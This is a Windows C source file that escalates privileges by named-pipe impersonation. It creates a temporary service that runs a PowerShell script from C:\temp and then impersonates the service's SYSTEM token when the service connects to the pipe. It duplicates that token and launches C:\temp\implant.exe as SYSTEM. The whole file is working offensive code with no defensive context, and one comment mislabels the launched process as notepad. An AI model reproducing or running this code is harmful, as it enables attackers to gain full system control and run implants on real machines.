
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

int ServiceGo(void) {

	SC_HANDLE scManager;
	SC_HANDLE scService;

	scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

	if (scManager == NULL) {
		return FALSE;
	}

	// create Piper service
	scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, 
							SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
							"C:\\Windows\\\System32\\cmd.exe /rpowershell.exe c:\\temp\\go.ps1",
							NULL, NULL, NULL, NULL, NULL);

	if (scService == NULL) {
		//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
		return FALSE;
	}
	
	// launch it
	StartService(scService, 0, NULL);

	// wait a bit and then cleanup
	Sleep(5000);
	DeleteService(scService);

	CloseServiceHandle(scService);
	CloseServiceHandle(scManager);	
}

int main() {

	LPCWSTR sPipeName = "\\\\.\\pipe\\piper";
	HANDLE hSrvPipe;
	HANDLE th;
	BOOL bPipeConn;
	char pPipeBuf[MESSAGE_SIZE];
	DWORD dBRead = 0;

	HANDLE hImpToken;
	HANDLE hNewToken;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	// open pipe
	hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, 
								PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);
	
	// create and run service
	th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ServiceGo, NULL, 0, 0);
	
	// wait for the connection from the service
	bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
	if (bPipeConn) {
		ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL);
	
		// impersonate the service (SYSTEM)
		if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
			return -1;
		}
		
		// wait for the service to cleanup
		WaitForSingleObject(th, INFINITE);
		
		// get a handle to impersonated token
		if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
				return -2;
			} 

		// create new primary token for new process
		if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation,
							TokenPrimary, &hNewToken)) {
				return -4;
		}

		//Sleep(20000);
		// spawn notepad.exe as full SYSTEM user
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		if (!CreateProcessWithTokenW(hNewToken, LOGON_NETCREDENTIALS_ONLY, NULL, L"C:\\temp\\implant.exe",
									NULL, NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
			return -5;
		}
		
		// revert back to original security context
		RevertToSelf();
	
	}
	

	return 0;
}

